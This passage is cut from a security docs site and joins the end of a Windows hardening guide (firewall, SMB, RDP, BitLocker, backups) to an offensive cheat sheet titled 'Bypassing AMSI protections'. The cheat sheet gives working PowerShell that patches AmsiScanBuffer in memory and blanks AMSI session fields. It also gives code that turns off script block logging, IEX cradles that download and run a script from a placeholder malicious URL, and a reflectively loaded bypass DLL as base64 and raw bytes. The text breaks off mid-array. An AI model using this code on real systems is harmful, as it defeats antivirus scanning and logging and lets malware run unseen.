possible, enable the Windows Defender Firewall default settings. For blocking all the incoming traffic, always configure the firewall with a \u0026lsquo;default deny\u0026rsquo; rule before making an exception rule that allows more specific traffic.\nDisable unused Networking Devices # Network devices like routers, ethernet cards, WiFI adapters etc., enable data sharing between computers. If the device is improperly configured or not being used by the owner, it is recommended to disable the interface so that threat actors cannot access them and use them for data retrieval from the victim\u0026rsquo;s computer. To disable the unused Networking Devices, go to the Control panel \u0026gt; System and Security Setting \u0026gt; System \u0026gt; Device Manager and disable all the unused Networking devices.\nDisable SMB Protocol # SMB is a file-sharing protocol exploited by hackers in the wild. The protocol is primarily used for file sharing in a network; therefore, you must disable the protocol if your computer is not part of a network by issuing the following command in PowerShell.\nProtecting Local Domain Name System (DNS) # The domain name system (DNS) is a naming system that translates Fully Qualified Domain Names (FQDN) into IP addresses. If the attacker places himself in the middle, he may intercept and manipulate DNS requests and point them to attacker-controlled systems since DNS replies are neither authenticated nor encrypted. The hosts file located in Windows acts like local DNS and is responsible for resolving hostnames to IP addresses. Malicious actors try to edit the file\u0026rsquo;s content to reroute traffic to their command and control server. The hosts file is located at C:\\Windows\\System32\\Drivers\\etc\\hosts.\nMitigating Address Resolution Protocol Attack # The address resolution protocol resolves MAC addresses from given IP addresses saved in the workstations ARP cache. The ARP offers no authentication and accepts responses from any user in the network. An attacker can flood target systems with crafted ARP responses, which point to an attacker-controlled machine and put him in the middle of communication between the targeted hosts.\nThe table contains MAC addresses in the middle and IP addresses in the left. If the table includes a MAC mapped to two IPs, you are probably susceptible to an ARP poisoning attack. To clear the ARP cache and prevent the attack, issue the command arp -d.\nPreventing Remote Access to Machine # Remote access provides a way to connect to other computers/networks even located at a different geographical location for file sharing and remotely make changes to a workstation. Microsoft has developed a Remote Desktop Protocol (RDP) for connecting with other computers. Hackers have exploited the protocol in the past, like the famous Blue Keep vulnerability, to gain unauthorised access to the target system. We must disable remote access (if not required) by going to settings \u0026gt; Remote Desktop. Do not attempt this in VM attached to this room.\nApplication Management # Trust Application Store # Microsoft Store offers a complete range of applications (games, utilities) and allows downloading non-malicious files through a single click. Malicious actors bind legitimate software with trojans and viruses and upload it on the internet to infect and access the victim\u0026rsquo;s computer. Therefore, downloading applications from the Microsoft Store ensures that the downloaded software is not malicious. We can access Microsoft Application Store by typing ms-windows-store in the Run dialogue.\nSafe App Installation # Only allow installation of applications from the Microsoft Store on your computer.\nGo to Setting \u0026gt; Select Apps and Features and then select The Microsoft Store only.\nMalware Removal through Windows Defender Anti-Virus # Windows Defender Anti Virus is a complete anti-malware program capable of identifying malicious programs and taking remedial measures like quarantine. The program used to have an entire Graphical User Interface; however, Windows 10 and newer versions manage the same through Windows Security Centre. Windows Defender primarily offers four main functionalities:\nReal-time protection - Enables periodic scanning of the computer. Browser integration - Enables safe browsing by scanning all downloaded files, etc. Application Guard - Allows complete web session sandboxing to block malicious websites or sessions to make changes in the computer. Controlled Folder Access - Protect memory areas and folders from unwanted applications. Microsoft Office Hardening # Microsoft Office Suite is one of the most widely used application suites in all sectors, including financial, telecom, education, etc. Malicious actors abuse its functionality through macros, Flash applets, object linking etc., to achieve Remote Code Execution. Hardening of Microsoft Office may vary from person to person as legitimate functionality of Microsoft Office is exploited to gain access. For example, disabling macros in a University may be helpful as no one uses it; however, banks cannot disable macros as they heavily rely on complex invoices and formulas through macros. The attached VM contains a batch file based on best practices and Microsoft Attack Surface Reduction Rules for hardening Microsoft Office. To execute the script, right-click on the file office.bat on Desktop and Run as Administrator.\nAppLocker # AppLocker is a recently introduced feature that allows users to block specific executables, scripts, and installers from execution through a set of rules. We can easily configure them on a single PC or network through a GUI by the following method:\nBrowser (MS Edge) # Microsoft Edge is a built-in browser available on Windows machines based on Chromium, inline with Google Chrome and Brave. The browser often acts as an entry point to a system for further pivoting and lateral movement. It is therefore of utmost importance to block and mitigate critical attacks carried out through a browser that include ransomware, ads, unsigned application downloads and trojans.\nProtecting the Browser through Microsoft Smart Screen # Microsoft SmartScreen helps to protect you from phishing/malware sites and software when using Microsoft Edge. It helps to make informed decisions for downloads and lets you browse safely in Microsoft Edge by: Displaying an alert if you are visiting any suspicious web pages. Vetting downloads by checking their hash, signature etc against a malicious software database.\nProtecting against phishing and malicious sites by checking visited websites against a threat intelligence database.To turn on the Smart Screen, go to Settings \u0026gt; Windows Security \u0026gt; App and Browser Control \u0026gt; Reputation-based Protection. Scroll down and turn on the SmartScreen option.\nOpen Microsoft Edge, go to Settings and then click “Privacy, Search and Services” - Set \u0026ldquo;Tracking prevention\u0026rdquo; to Strict to avoid tracking through ads, cookies etc.\nStorage Management # Data Encryption through BitLocker # Encryption of the computer is one of the most vital things to which we usually pay little attention. The worst nightmare is that someone gets unfettered access to your devices\u0026rsquo; data. Encryption ensures that you or someone you share the recovery key with can access the stored content. Microsoft, for its business edition of Windows, utilises the encryption tools by BitLocker. Let us have a quick look at how one can ensure to protect the data through BitLocker encryption features available on the Home Editions of Windows 10. You have already read about it here (Task 8). Go to Start \u0026gt; Control Panel \u0026gt; System and Security \u0026gt; BitLocker Drive Encryption. You can easily see if the option to BitLocker Drive Encryption is enabled or not.\nA trusted Platform Module chip TPM is one of the basic requirements to support BitLocker device encryption. Keeping the BitLocker recovery key in a secure place (preferably not on the same computer) is imperative. You can read more about BitLocker Recovery here.\nWindows Sandbox # To run applications safely, we can use a temporary, isolated, lightweight desktop environment called Windows Sandbox. We can install software inside this safe environment, and this software will not be a part of our host machine, it will remain sandboxed. Once the Windows Sandbox is closed, everything, including files, software, and states will be deleted. We would require Virtualisation enabled on our OS to run this feature. We cannot try this in the attached VM but the steps for enabling the Sandbox feature are as below: Click Start \u0026gt; Search for \u0026lsquo;Windows Features\u0026rsquo; and turn it on \u0026gt; Select Sandbox \u0026gt; Click OK to restart\nIf you want to close the Sandbox, click the close button, and it will disappear. Opening suspicious files in a Windows Sandbox before blindly executing them in your base OS is recommended.\nWindows Secure Boot # Secure boot – an advanced security standard - checks that your system is running on trusted hardware and firmware before booting, which ensures that your system boots up safely while preventing unauthorised software access from taking control of your PC, like malware. You are already in a secure boot environment if you run a modern PC with Unified Extensible Firmware Interface UEFI (the best replacement for BIOS) or Windows 10. You can check the status of the secure boot by following:\nThe incredible thing is that you do not need to enable or install it as it works silently in the background. Windows allows you to disable these features, which is not recommended. You can enable Secure boot from BIOS settings (if disabled).\nEnable File Backups # The last option, but certainly not the least important one to prevent losing irreplaceable and critical files is to enable file backups. Despite all the above techniques, if you somehow lose essential data/files, you can recover the loss by restoring it, if you have a file backup option. Creating file backups is the best option to avoid disasters like malware attacks or hardware failure. You can enable the file backup option through Settings \u0026gt; Update and Security \u0026gt; Backup:-\nTherefore, the most convenient option is enabling it from the \u0026lsquo;File History\u0026rsquo; option - a built-in functionality of Windows 10 and 11.\n"},{"id":7,"href":"/docs/windows_amsi_bypass/","title":"Bypassing AMSI protections","section":"Docs","content":" AMSI Bypass # Which Endpoint Protection is Using AMSI # https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F Patching amsi.dll AmsiScanBuffer by rasta-mouse # $Win32 = @\u0026#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \u0026#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\u0026#34;am\u0026#34; + \u0026#34;si.dll\u0026#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, \u0026#34;Amsi\u0026#34; + \u0026#34;Scan\u0026#34; + \u0026#34;Buffer\u0026#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) Dont use net webclient # Not Working anymore, there was a patch for it\n$webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’) $resp=$webreq.GetResponse() $respstream=$resp.GetResponseStream() $reader=[System.IO.StreamReader]::new($respstream) $content=$reader.ReadToEnd() IEX($content) The Short version of dont use powershell net webclient # Not Working anymore, there was a patch for it\nIEX([Net.Webclient]::new().DownloadString(\u0026#34;https://maliciousscripturl/malicious.ps1\u0026#34;)) Amsi ScanBuffer Patch # Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass\nWrite-Host \u0026#34;-- AMSI Patch\u0026#34; Write-Host \u0026#34;-- Paul Laîné (@am0nsec)\u0026#34; Write-Host \u0026#34;\u0026#34; $Kernel32 = @\u0026#34; using System; using System.Runtime.InteropServices; public class Kernel32 { [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr LoadLibrary(string lpLibFileName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \u0026#34;@ Add-Type $Kernel32 Class Hunter { static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) { while ($true) { [int]$count = 0 while ($true) { [IntPtr]$address = [IntPtr]::Add($address, 1) If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) { $count++ If ($count -eq $egg.Length) { return [IntPtr]::Subtract($address, $egg.Length - 1) } } Else { break } } } return $address } } [IntPtr]$hModule = [Kernel32]::LoadLibrary(\u0026#34;amsi.dll\u0026#34;) Write-Host \u0026#34;[+] AMSI DLL Handle: $hModule\u0026#34; [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, \u0026#34;DllCanUnloadNow\u0026#34;) Write-Host \u0026#34;[+] DllCanUnloadNow address: $dllCanUnloadNowAddress\u0026#34; If ([IntPtr]::Size -eq 8) { Write-Host \u0026#34;[+] 64-bits process\u0026#34; [byte[]]$egg = [byte[]] ( 0x4C, 0x8B, 0xDC, # mov r11,rsp 0x49, 0x89, 0x5B, 0x08, # mov qword ptr [r11+8],rbx 0x49, 0x89, 0x6B, 0x10, # mov qword ptr [r11+10h],rbp 0x49, 0x89, 0x73, 0x18, # mov qword ptr [r11+18h],rsi 0x57, # push rdi 0x41, 0x56, # push r14 0x41, 0x57, # push r15 0x48, 0x83, 0xEC, 0x70 # sub rsp,70h ) } Else { Write-Host \u0026#34;[+] 32-bits process\u0026#34; [byte[]]$egg = [byte[]] ( 0x8B, 0xFF, # mov edi,edi 0x55, # push ebp 0x8B, 0xEC, # mov ebp,esp 0x83, 0xEC, 0x18, # sub esp,18h 0x53, # push ebx 0x56 # push esi ) } [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg) Write-Host \u0026#34;[+] Targeted address: $targetedAddress\u0026#34; $oldProtectionBuffer = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null $patch = [byte[]] ( 0x31, 0xC0, # xor rax, rax 0xC3 # ret ) [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3) $a = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null Forcing an error # $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(\u0026#34;System.Management.Automation.AmsiUtils\u0026#34;).GetField(\u0026#34;amsiSession\u0026#34;,\u0026#34;NonPublic,Static\u0026#34;).SetValue($null, $null);[Ref].Assembly.GetType(\u0026#34;System.Management.Automation.AmsiUtils\u0026#34;).GetField(\u0026#34;amsiContext\u0026#34;,\u0026#34;NonPublic,Static\u0026#34;).SetValue($null, [IntPtr]$mem) Disable Script Logging # $settings = [Ref].Assembly.GetType(\u0026#34;System.Management.Automation.Utils\u0026#34;).GetField(\u0026#34;cachedGroupPolicySettings\u0026#34;,\u0026#34;NonPublic,Static\u0026#34;).GetValue($null); $settings[\u0026#34;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\u0026#34;] = @{} $settings[\u0026#34;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\u0026#34;].Add(\u0026#34;EnableScriptBlockLogging\u0026#34;, \u0026#34;0\u0026#34;) [Ref].Assembly.GetType(\u0026#34;System.Management.Automation.ScriptBlock\u0026#34;).GetField(\u0026#34;signatures\u0026#34;,\u0026#34;NonPublic,static\u0026#34;).SetValue($null, (New-Object \u0026#39;System.Collections.Generic.HashSet[string]\u0026#39;)) Amsi Buffer Patch - In memory # function Bypass-AMSI { if(-not ([System.Management.Automation.PSTypeName]\u0026#34;Bypass.AMSI\u0026#34;).Type) { [Reflection.Assembly]::Load([Convert]::FromBase64String(\u0026#34;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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAA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#34;)) | Out-Null Write-Output \u0026#34;DLL has been reflected\u0026#34;; } [Bypass.AMSI]::Patch() } Same as 6 but integer Bytes instead of Base64 # function MyPatch{ if(-not ([System.Management.Automation.PSTypeName]\u0026#34;Bypass.AMSI\u0026#34;).Type) { [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 